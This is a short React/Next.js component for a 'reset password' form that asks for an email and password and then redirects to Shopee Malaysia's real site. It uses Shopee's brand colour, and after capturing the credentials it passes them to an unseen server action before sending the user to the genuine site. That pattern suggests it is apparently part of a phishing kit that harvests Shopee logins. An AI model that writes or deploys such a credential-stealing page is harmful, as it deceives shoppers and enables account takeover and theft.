"use client";
import React from "react";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "./ui/form";
import { z } from "zod";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { formSchema } from "@/lib/form_schema";
import { resetPassword } from "@/app/_actions";
import { redirect } from "next/navigation";

const ResetPasswordForm = () => {
  const [loading, setLoading] = React.useState(false);
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: "",
      password: "",
      confirm_password: "",
    },
  });
  // 2. Define a submit handler.
  async function onSubmit(values: z.infer<typeof formSchema>) {
    setLoading(true);
    await resetPassword(values);
    redirect("https://shopee.com.my/");
  }
  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4 w-full max-w-md mx-auto p-4">
      <FormField
        control={form.control}
        name="email"
        render={({ field }) => (
        <FormItem>
          <FormLabel className="text-sm md:text-base">Email</FormLabel>
          <FormControl>
          <Input placeholder="Email" {...field} className="w-full" />
          </FormControl>
          <FormMessage />
        </FormItem>
        )}
      />
      <FormField
        control={form.control}
        name="password"
        render={({ field }) => (
        <FormItem>
          <FormLabel className="text-sm md:text-base">Password</FormLabel>
          <FormControl>
          <Input placeholder="Password" type="password" {...field} className="w-full" />
          </FormControl>
          <FormMessage />
        </FormItem>
        )}
      />
      <FormField
        control={form.control}
        name="confirm_password"
        render={({ field }) => (
        <FormItem>
          <FormLabel className="text-sm md:text-base">Confirm Password</FormLabel>
          <FormControl>
          <Input placeholder="Password" type="password" {...field} className="w-full" />
          </FormControl>
          <FormMessage />
        </FormItem>
        )}
      />
      <Button 
        type="submit" 
        className="w-full rounded-none bg-[#EE4D2D] text-sm md:text-base py-2 md:py-3" 
        disabled={loading}
      >
        CONTINUE
      </Button>
      </form>
    </Form>
  );
};

export default ResetPasswordForm;
